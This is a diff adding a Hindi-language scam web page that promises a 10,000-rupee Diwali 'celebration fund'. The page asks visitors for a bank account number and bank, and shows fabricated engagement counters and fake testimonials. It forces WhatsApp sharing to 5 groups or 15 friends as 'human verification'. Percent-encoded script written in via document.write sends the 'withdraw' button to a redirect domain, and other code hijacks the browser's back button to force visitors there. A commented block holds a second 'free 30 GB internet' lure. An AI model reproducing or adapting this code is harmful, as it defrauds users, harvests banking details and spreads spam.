@@ -1,0 +1,696 @@
+
+
+
+
+
+
+
+<!DOCTYPE html>
+    <script>
+
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
+
+
+    </script>
+  
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Diwali 10,000 rupes Celebration Fund</title>
+        <link rel="shortcut icon" type="image/png" href="https://shriprasadam.online/cdn/shop/articles/Diwali_2025.png?v=1760704081" />
+        <meta name="og:title" content="Get Now!!!: Diwali 10,000 rupes Celebration Fund " />
+        <meta property="og:description" content="Click o get Diwali 10,000 rupes Celebration Fund" />
+        <meta property="og:image" content="https://shriprasadam.online/cdn/shop/articles/Diwali_2025.png?v=1760704081" />
+        <meta property="og:type" content="website" />
+    <meta property="og:updated_time" content="1440432930" />
+    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692" />
+
+<link rel="me" href="https://www.blogger.com/profile/17222055979768522082" />
+</head>
+<body>
+<style type="text/css">
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+* {
+    margin: 0;
+    padding: 0;
+    font-family: Poppins, Droid Arabic Naskh;
+    font-weight: normal;
+    box-sizing: border-box;
+
+
+}
+body {
+    direction: lfl;
+    background: #ebedf0;
+}
+a {
+    text-decoration: none;
+}
+.post {
+    background: #fff;
+    margin: 0 auto;
+    padding: 10px;
+    max-width: 500px;
+    border: 1px solid #AA2E4E;
+    border-radius: 3px;
+}
+.post img {
+    width: 100%;
+}
+.welcome {
+    font-size: 15px;
+}
+.amount,
+#getname {
+    color: #AA2E4E;
+    text-decoration: none;
+}
+.done {
+    text-align: center;
+    color: #AA2E4E;
+}
+.tip {
+    font-size: 14px;
+}
+.title {
+    text-align: center;
+}
+.error {
+    display: none;
+    text-align: center;
+    font-size: 14px;
+    color: #e74c3c;
+}
+button {
+    display: block;
+    width: 200px;
+    height: 50px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 24px;
+    cursor: pointer;
+    border-radius: 5px;
+    padding: 0 10px;
+    margin: 10px auto;
+    background: #AA2E4E;
+    transition: background 0.3s #000;
+}
+button:hover {
+    background: #AA2E4E;
+}
+.phone {
+    max-width: 400px;
+    margin: 10px auto;
+}
+.phone input {
+    width: 100%;
+    height: 50px;
+    padding: 10px;
+    outline: none;
+    border: 2px solid #cecece;
+    font-size: 14px;
+}
+#confirm {
+    width: 200px;
+    margin: 10px auto;
+    border-radius: 0px;
+}
+#loader {
+    text-align: center;
+}
+.spin {
+    width: 50px;
+    height: 50px;
+    background: transparent;
+    border: solid 8px #AA2E4E;
+    border-right-color: transparent;
+    border-radius: 50%;
+    margin: 10px auto;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    100% {
+        transform: rotate(1turn);
+    }
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+    display: none;
+}
+.center {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #AA2E4E;
+}
+#fill,
+#fill2 {
+    background: #AA2E4E;
+    width: 0%;
+    height: 100%;
+}
+.percentage {
+    width: 100px;
+    float: right;
+    height: 35px;
+    font-size: 16px;
+    border: 2px solid #AA2E4E;
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+}
+#check,
+#check2 {
+    display: none;
+}
+.counter {
+    color: #AA2E4E;
+    font-size: 12px;
+    text-align: right;
+    padding: 10px 0 10px 2px;
+    border-bottom: 1px solid #AA2E4E;
+}
+.reactions {
+    display: inline-flex;
+    align-items: center;
+    float: left;
+}
+.counter img {
+    float: left;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid #fff;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+}
+.like {
+    z-index: 2;
+}
+.love {
+    z-index: 1;
+}
+.bar {
+    display: table;
+    width: 100%;
+    border-bottom: 1px solid #e1e2e3;
+}
+.bar .react {
+    display: table-cell;
+    width: calc(100% / 3);
+    font-size: 12px;
+    color: #7f7f7f;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+}
+.comments {
+    direction: ltr;
+}
+.comment {
+    padding: 6px 0;
+    margin-top: 5px;
+}
+.comment img {
+    float: left;
+    width: 32px;
+    height: 32px;
+    border: none;
+    border-radius: 18px;
+    cursor: pointer;
+}
+.reply {
+    margin-left: 37px;
+}
+.single-container {
+    margin-left: 37px;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    font-size: 12px;
+}
+.single-container .user {
+    display: inline-block;
+    cursor: pointer;
+    color: #365899;
+    margin-bottom: 5px;
+}
+.single-container .text {
+    display: block;
+}
+.buttons {
+    font-size: 12px;
+    font-weight: bold;
+    margin: 10px 0 0 47px;
+    color: #90949c;
+}
+.action {
+    cursor: pointer;
+}
+.action:hover {
+    text-decoration: underline;
+}
+.input {
+    padding: 6px 12px 12px;
+}
+.input input {
+    width: 100%;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    border: 0;
+    outline: none;
+}
+.A{
+    text-align: center;
+    background-color: #AA2E4E;
+}
+</style>
+  
+  
+                    <center><img src="https://shriprasadam.online/cdn/shop/articles/Diwali_2025.png?v=1760704081" alt="easter fund" style="width: 100%;"></center>
+                       <marquee class="horizontal_marque" direction="left">दिवाली उत्सव निधि: प्राप्त करें 10,000 Rupees का उत्सव फंड</marquee> <div class="A">
+              </div>
+
+           <script type="text/javascript">
+                     var timeleft = 4548;
+                     var downloadTimer = setInterval(function(){
+                         timeleft= timeleft + Math.floor(Math.random() * 600);
+                         document.getElementById('countdowntimer').textContent = timeleft;
+                         if (timeleft <= 0)
+                             clearInterval(downloadTimer);
+                     }, 1000);
+                 </script>
+         </div>
+    <div class="post" width="100%">
+
+        <div id="intro">
+         
+            <p class="welcome">
+                
+
+        <center>दिवाली एनिवर्सरी फंड: दिवाली उत्सव के उपलक्ष्य में <span class="amount">10,000 Rupees फंड</span> प्राप्त करें, अपना बैंक खाता नंबर दर्ज करने के लिए नीचे दिए गए लिंक पर क्लिक करें।</center> <br> 
+<center><span class="amount">अच्छी खबर!!!</span> हैप्पी दिवाली सेलिब्रेशन।</center><br>
+                 
+                </p>
+          
+               
+<button id="go">अभी प्रवेश करें!</button>
+</div>
+<div id="loader">
+    <div>कृपया प्रतीक्षा करें ...</div>
+    <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <div id="info">
+           <p class="title">अपना खाता संख्या दर्ज करें:</p>
+<div class="phone">
+    <center>
+        <input type="char" placeholder="यहाँ दर्ज करें" id="name" name="Phone" 
+        style="fontwidth: 244px; height: 56px; font-size: 18px; width: 330px; margin-bottom: 20px;" 
+        onkeypress="return numberonly(event);">
+    
+<br>
+              
+                <button id="confirm" onclick="getit()">जारी रखें</button>
+            </div>
+            <p class="error">अपना खाता नंबर दर्ज करें!</p>
+</div>
+<div id="checking">
+    <p class="title">कृपया प्रतीक्षा करें, प्रक्रिया जारी है...</p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
+                </div>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
+                </div>
+            </div>
+        </div>
+       <div id="share"> 
+  <center>
+    <p class="tip">आप उन लोगों में से एक हैं जिन्हें 10,000 Rupees उत्सव फंड प्राप्त होगा</p>
+    <p class="tip">खाता संख्या: <span id="getname"></span>.</p>
+    <div align="center">
+      <br>
+      <font color="darkred">
+        <b>अपना बैंक चुनें</b>
+      </font>
+      <br/>
+      <font color="green">
+        <select id="country" name="country">
+          <option value="mtn">यहाँ चुनें</option>
+  <option value="sbi">State Bank of India</option>
+<option value="pnb">Punjab National Bank</option>
+<option value="bob">Bank of Baroda</option>
+<option value="canara">Canara Bank</option>
+<option value="boi">Bank of India</option>
+<option value="unionbank">Union Bank of India</option>
+<option value="iob">Indian Overseas Bank</option>
+<option value="uco">UCO Bank</option>
+<option value="indianbank">Indian Bank</option>
+<option value="centralbank">Central Bank of India</option>
+<option value="bankmaharashtra">Bank of Maharashtra</option>
+<option value="punandsind">Punjab & Sind Bank</option>
+<option value="airtelpay">Airtel Payments Bank</option>
+<option value="paytm">Paytm Payments Bank</option>
+<option value="indiaPost">India Post Payments Bank</option>
+<option value="fino">Fino Payments Bank</option>
+<option value="jio">Jio Payments Bank</option>
+<option value="niyo">Niyo Bank</option>
+<option value="fi">Fi Money (Federal Bank Partner)</option>
+<option value="jupiter">Jupiter (Federal Bank Partner)</option>
+<option value="open">Open Bank (ICICI Partner)</option>
+<option value="razorpayx">RazorpayX (ICICI Partner)</option>
+<option value="sbi">Other</option>
+ </select></font>
+                  </div>
+            <br>
+            <br>
+        </center>
+            <p class="tip">
+   अपने 10,000 Rupees सेलिब्रेशन फंड को सक्रिय करने के लिए, कृपया मानव सत्यापन की पुष्टि के लिए इसे दूसरों के साथ साझा करें।
+</p><br>
+
+<p class="tip">
+   1. इस जानकारी को दूसरों के साथ साझा करें (WhatsApp पर 5 समूहों या 15 दोस्तों के साथ) (नीचे दिए गए "SHARE" आइकन पर क्लिक करें)।
+</p>
+
+<p class="tip">
+   2. मानव सत्यापन कार्य पूरा करने के बाद "Confirm" पर क्लिक करें।
+</p>
+
+<button id="whatsapp">SHARE</button>
+             <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+           <p class="title">बधाई हो, आपका 10,000 Rupees सेलिब्रेशन फंड स्वीकृत हो गया है, अपने बैंक खाते में निकालने के लिए नीचे दिए गए लिंक पर क्लिक करें।</p>
+            <button id="offer">WITHDRAW NOW!</button>
+           
+            </div>
+        <div class="comments">
+            <div class="counter">
+                <div class="reactions">
+                    <img class="like" src="prof5.jpeg" /> <img class="love" src="prof2.jpeg" /> <img class="care" src="prof1.jpeg" /> <span id="likes">134K</span>
+                </div>
+                <span id="comments">23K comments</span> <span class="dot">·</span> <span id="shares">12K shares</span>
+            </div>
+            <div class="bar">
+                <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span> <span class="react"><i class="fa fa-comment-o"></i> Comment</span> <span class="react"><i class="fa fa-share"></i> Share</span>
+            </div>
+            <div>
+                <div class="comment">
+                    </div>
+                </div>
+                <div class="comment">
+                    <img src="prof5.jpeg" />
+                    <div class="single-container">
+                       <span class="user"> Abdul Khan</span>
+<span class="text">
+    सभी को हैप्पी दिवाली एनिवर्सरी, मुझे यह 10,000 Rupees देने के लिए बहुत-बहुत धन्यवाद।
+</span>
+</div>
+<div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+</div>
+<div class="comment">
+    <img src="prof1.jpeg" />
+    <div class="single-container"><span class="user">Muhammed Sahu </span> 
+        <span class="text"> मैं पंजाब ज़िले से हूँ, मुझे बहुत खुशी है कि मैं भाग्यशाली लोगों में से एक हूँ। </span>
+    </div>
+    <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+</div>
+<div class="comment reply">
+    <img src="prof4.jpeg" />
+    <div class="single-container"><span class="user"> Mohd Kumar </span> 
+        <span class="text"> मुझे अभी क्रेडिट मिला है, दोस्तों यह सच में रियल है! </span>
+    </div>
+    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+</div>
+<div class="comment">
+    <img src="prof2.jpeg" />
+    <div class="single-container"><span class="user"> Kumar Bhai</span> 
+        <span class="text"> धन्यवाद इसके लिए, मुझे एक मैसेज मिला है कि इंतज़ार करें। </span>
+    </div>
+    <div class="buttons"><span class="time t3">4m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+</div>
+<div class="input"><input placeholder="टिप्पणी लिखें..." /></div>
+            </div>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+$("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+</script>
+
+
+
+
+<!--
+"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
+-->
+   <script>
+         var text1 ="*दीवाली 10,000 Rupees वर्षगांठ फंड*%0A%0A10,000 Rupees दीवाली सेलिब्रेशन फंड पाने के लिए नीचे दिए गए लिंक पर क्लिक करके अपना बैंक खाता विवरण भरें।%0A%0A%0A *यहां क्लिक करें* 👉: diwali-celebration-fund.gettlk.online";
+        
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly ðŸ‘‰ ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "//augailou.com/4/5626859",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+    </script>
+
+
+
+
+
+
+<script>
+<!-- code by OD -->
+document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+</script>
+
+
+
+<script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="//augailou.com/4/5626859";
+    }
+    function goon(){
+        location.href="//augailou.com/4/5626859";
+    }
+</script>
+
+
+<script>
+(function (global) {
+
+	if(typeof (global) === "Undisclose")
+	{
+		throw new Error("window is Undisclose");
+	}
+
+    var _hash = "!";
+    var noBackPlease = function () {
+        global.location.href += "#";
+
+		// making sure we have the fruit available for juice....
+		// 50 milliseconds for just once do not cost much (^__^)
+        global.setTimeout(function () {
+            global.location.href += "!";
+        }, 50);
+    };
+	
+	// Earlier we had setInerval here....
+    global.onhashchange = function () {
+        if (global.location.hash !== _hash) {
+            global.location.hash = _hash;
+        }
+    };
+
+    global.onload = function () {
+        
+		noBackPlease();
+
+		// disables backspace on page except on input fields and textarea..
+		document.body.onkeydown = function (e) {
+            var elm = e.target.nodeName.toLowerCase();
+            if (e.which === 8 && (elm !== 'input' && elm  !== 'textarea')) {
+                e.preventDefault();
+            }
+            // stopping event bubbling up the DOM tree..
+            e.stopPropagation();
+        };
+		
+    };
+
+})(window);
+</script>
+
+<script>
+        var nums = document.getElementById('nums');
+        var add = document.getElementById('add');
+        var getnum = document.getElementById('getnum')
+        var getadd = document.getElementById('getadd')
+    function getit(){
+        
+        nums = nums.value;
+        add = add.value;
+        getnum.innerHTML= nums;
+        getnum.style.color="green"
+        getadd.innerHTML= add;
+        getadd.style.color="green"
+
+    }
+</script>
+
+
+</body></html>
+<!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1723451,"ffffff","fff0f0");</script><!-- END: Powered by Supercounters.com -->
